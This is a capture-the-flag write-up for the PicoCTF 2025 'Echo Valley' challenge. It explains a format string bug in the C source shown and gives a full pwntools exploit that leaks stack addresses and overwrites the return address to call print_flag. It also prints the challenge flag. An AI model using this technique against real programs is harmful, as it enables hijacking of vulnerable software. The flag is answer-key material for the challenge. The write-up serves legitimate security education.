# ğŸ™ï¸ Challenge: Echo Valley â€” Format String Exploitation

**Category:** Binary Exploitation  
**CTF:** PicoCTF 2025  
**Flag:** `picoCTF{f1ckl3_f0rmat_f1asc0}`

---

## ğŸ“ Description

> The Echo Valley is a simple function that echoes back whatever you say to it. But how do you make it respond with something more interesting â€” like a flag?  
>  
> You're given the source and binary of a program. Can you exploit it to leak the flag from `/home/valley/flag.txt`?

---

## ğŸ§  Summary

The challenge binary `valley` includes a function called `print_flag()` that reads and prints the flag, but it is never called in the program flow. The program instead reads and echoes back user input via the vulnerable `printf(buf)` statement â€” a clear case for **Format String Vulnerability**.

---

## ğŸ” Vulnerability Analysis

The vulnerable code is found in `echo_valley()`:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```
In hint it is saying - Ever heard of a format string attack?

We have to do format string attack.

This directly passes unsanitized input to printf, allowing format string specifiers (e.g., %p, %x, %n) to be interpreted â€” leading to memory leaks and potentially arbitrary memory writes.

## ğŸ”“ Exploitation Steps
## ğŸ” Step 1: Leak Stack and Main Return Address

We send a format string payload to enumerate values on the stack:

```
%1$p | %2$p | %3$p | ... | %30$p
```

This helps us locate:

    The return address on the stack.

    A memory leak that we can correlate with the binaryâ€™s main() function address.

Sample leak:

```
0x555555555413 | 0x555555555269
```

Where:

    `0x555555555413 corresponds to main (in GDB).`

    `0x555555555269 corresponds to print_flag.`

We calculate the runtime address of print_flag() using the delta between these two.
## ğŸ§® Step 2: Calculate Addresses

```
stack_address = int(leaks[0], 16) - 8
leaks_add     = int(leaks[1], 16)

gdb_leak = 0x0000555555555413  # main in GDB
gdb_flag = 0x0000555555555269  # print_flag in GDB

real_flag = (gdb_flag - gdb_leak) + leaks_add
```

This computes the actual memory address of print_flag() based on runtime leak offsets.
## ğŸ§¨ Step 3: Overwrite Return Address

Using fmtstr_payload() from pwntools, we craft a payload to overwrite the return address on the stack with the address of print_flag().

payload = fmtstr_payload(offset, {stack_address: real_flag}, write_size="short")

The offset is determined from earlier format string probing.
## ğŸ§ª Full Exploit Code

```
from pwn import *

e = ELF('./valley')
context.binary = './valley'
# p = process('./valley')  # for local testing

p = remote('shape-facility.picoctf.net', 53151)

# Leak addresses
p.sendline(b'%20$p|%21$p')
p.recvuntil(b'You heard in the distance: ')
leaks = p.recvline().strip().decode().split('|')

stack_address = int(leaks[0], 16) - 8
leaks_add = int(leaks[1], 16)

gdb_leak = 0x0000555555555413
gdb_flag = 0x0000555555555269
real_flag = (gdb_flag - gdb_leak) + leaks_add

offset = 6  # confirmed by trial

payload = fmtstr_payload(offset, {stack_address: real_flag}, write_size='short')
p.sendline(payload)
p.sendline(b'exit')
p.interactive()

```

## ğŸ Final Flag

`picoCTF{f1ckl3_f0rmat_f1asc0}`

## ğŸ§° Tools & Techniques Used

    pwntools (fmtstr_payload, ELF, remote)

    Format string probing (%p)

    Stack address leakage and return address overwrite

    Manual offset calculations and GDB verification

## ğŸ“š References

    Format String Exploitation â€” PayloadsAllTheThings

    Pwntools Documentation

    LiveOverflow Format String Attack Series

## âš ï¸ Disclaimer

This writeup is intended for educational use only. Unauthorized exploitation of format string vulnerabilities on systems without permission is unethical and potentially illegal.


